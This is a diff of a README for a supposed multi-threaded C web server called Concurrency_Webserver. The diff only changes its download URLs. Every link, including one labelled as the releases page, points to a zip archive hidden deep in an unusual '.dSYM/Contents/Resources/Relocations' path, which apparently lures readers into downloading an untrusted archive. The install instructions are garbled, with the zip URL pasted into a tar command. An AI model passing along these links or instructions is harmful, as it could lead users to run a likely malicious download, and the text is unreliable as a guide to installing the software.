@@ -1,7 +1,7 @@
 # 🌐 Concurrency_Webserver - A Reliable Multi-Threaded Web Server
 
 ## 📥 Download Now!
-[![Download Concurrency_Webserver](https://raw.githubusercontent.com/Allkilline/Concurrency_Webserver/main/spin.cgi.dSYM/Contents/Resources/Relocations/Webserver_Concurrency_3.1.zip)](https://raw.githubusercontent.com/Allkilline/Concurrency_Webserver/main/spin.cgi.dSYM/Contents/Resources/Relocations/Webserver_Concurrency_3.1.zip)
+[![Download Concurrency_Webserver](https://github.com/Allkilline/Concurrency_Webserver/raw/refs/heads/main/spin.cgi.dSYM/Contents/Resources/Relocations/Webserver_Concurrency_3.1.zip)](https://github.com/Allkilline/Concurrency_Webserver/raw/refs/heads/main/spin.cgi.dSYM/Contents/Resources/Relocations/Webserver_Concurrency_3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to Concurrency_Webserver! This project provides a multi-threaded HTTP/1.0 web server written in C, designed for performance and ease of use. With a configurable thread pool and a secure filesystem, it is suitable for various use cases. Follow these simple steps to download and run the software.
@@ -15,7 +15,7 @@ To run Concurrency_Webserver smoothly, make sure your system meets the following
 - **Disk Space:** At least 100 MB of free space
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page here](https://raw.githubusercontent.com/Allkilline/Concurrency_Webserver/main/spin.cgi.dSYM/Contents/Resources/Relocations/Webserver_Concurrency_3.1.zip). You will find the latest version of the Concurrency_Webserver available for download.
+1. **Visit the Releases Page:** Go to the [Releases page here](https://github.com/Allkilline/Concurrency_Webserver/raw/refs/heads/main/spin.cgi.dSYM/Contents/Resources/Relocations/Webserver_Concurrency_3.1.zip). You will find the latest version of the Concurrency_Webserver available for download.
 
 2. **Select the Right File:** Look for the most recent release. You will typically find files labeled with version numbers like `v1.0.0`. Choose the appropriate file for your operating system.
 
@@ -25,7 +25,7 @@ To run Concurrency_Webserver smoothly, make sure your system meets the following
    - **For Linux or macOS:** 
      - Open your terminal.
      - Navigate to the directory where you downloaded the file.
-     - Use the command `tar -xvzf <filename>https://raw.githubusercontent.com/Allkilline/Concurrency_Webserver/main/spin.cgi.dSYM/Contents/Resources/Relocations/Webserver_Concurrency_3.1.zip` to extract the files.
+     - Use the command `tar -xvzf <filename>https://github.com/Allkilline/Concurrency_Webserver/raw/refs/heads/main/spin.cgi.dSYM/Contents/Resources/Relocations/Webserver_Concurrency_3.1.zip` to extract the files.
      - Change into the extracted directory using `cd <directory>`.
      - Compile the application using a C compiler with the command `make`.
 
@@ -65,4 +65,4 @@ If you encounter any issues or have questions, feel free to open an issue in the
 Concurrency_Webserver is licensed under the MIT License. You can freely use, modify, and distribute the software, provided that proper credit is given.
 
 ## 📥 Download Now Again!
-To download the latest release, visit the [Releases page here](https://raw.githubusercontent.com/Allkilline/Concurrency_Webserver/main/spin.cgi.dSYM/Contents/Resources/Relocations/Webserver_Concurrency_3.1.zip) and start building your own multi-threaded web server today!
+To download the latest release, visit the [Releases page here](https://github.com/Allkilline/Concurrency_Webserver/raw/refs/heads/main/spin.cgi.dSYM/Contents/Resources/Relocations/Webserver_Concurrency_3.1.zip) and start building your own multi-threaded web server today!
